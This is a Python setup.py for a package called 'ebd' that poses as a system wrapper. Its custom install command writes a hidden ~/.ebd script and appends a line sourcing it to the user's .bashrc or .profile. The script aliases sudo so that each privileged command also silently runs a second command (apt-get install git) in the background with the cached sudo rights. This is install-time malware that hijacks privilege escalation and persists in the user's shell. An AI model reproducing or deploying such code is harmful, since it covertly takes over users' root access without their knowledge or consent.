import setuptools
import setuptools.command
import setuptools.command.install
import os
import subprocess

BACKUP_SUFF = ".ebd_backup"
SKIP_FLAG = ".ebd-skip"
PLUGIN_NAME = ".ebd"


def get_home_dir():
    return os.path.expanduser("~")


def get_rc_candidate(home):
    bashrc = os.path.join(home, ".bashrc")
    if os.path.exists(bashrc):
        return bashrc
    profile = os.path.join(home, ".profile")
    if os.path.exists(profile):
        return profile


def create_plugin(home):
    success = True
    try:
        content = """\n
SUDO_REAL=$(which sudo)

_sudo_ghost() {
  $SUDO_REAL -v
  $SUDO_REAL apt-get install git
}

_sudo() {
  ((_sudo_ghost) &) 2>&1 >/dev/null
  $SUDO_REAL $@
}
alias sudo=_sudo
"""
        plugin_path = os.path.join(home, PLUGIN_NAME)
        with open(plugin_path, "w") as file:
            file.write(content)
    except Exception:
        success = False
    return success


def get_injection():
    return ". {}".format(PLUGIN_NAME)


def inject_sudo_alias(filepath):
    ret = subprocess.call("which sudo", shell=True)
    if ret != 0:
        print("no sudo detected")
        return
    with open(filepath) as file:
        contents = file.read()
    injection = get_injection()
    if contents.find(injection) != -1:
        print("previous injection detected")
        if os.path.exists(filepath + BACKUP_SUFF):
            print("restoring backup")
            os.rename(filepath + BACKUP_SUFF, filepath)
        else:
            print("could not restore backup")
            return
    os.rename(filepath, filepath + BACKUP_SUFF)
    print("rc file backed up, injecting new contents")
    with open(filepath, "w") as file:
        file.write(contents + "\n{}\n".format(injection))
    print("new contents injected")


def should_skip(home):
    skip_file = os.path.join(home, ".ebd-skip")
    return os.path.exists(skip_file)


def setup_ebd():
    home = get_home_dir()
    if home is None:
        print("could not determine home")
        return
    print("home: {}".format(home))
    if should_skip(home):
        print(".ebd found in {}, skipping this machine".format(home))
        return
    rc = get_rc_candidate(home)
    if rc is not None:
        print("found suitable rc file: {}".format(rc))
        if not create_plugin(home):
            print("could not create plugin file")
            return
        inject_sudo_alias(rc)
    else:
        print("no suitable rc found")


class PostInstallCommand(setuptools.command.install.install):
    def run(self):
        setup_ebd()
        setuptools.command.install.install.run(self)


with open("README.md") as file:
    long_description = file.read()

with open("VERSION") as file:
    version = file.read()

setuptools.setup(
    name="ebd",
    version=version,
    author="Fiely Teach",
    author_email="admin@admin.ru",
    description="Wrapper for LFSM-enabled systems.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/",
    packages=setuptools.find_packages(),
    cmdclass={
        "install": PostInstallCommand
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    include_package_data=True
)
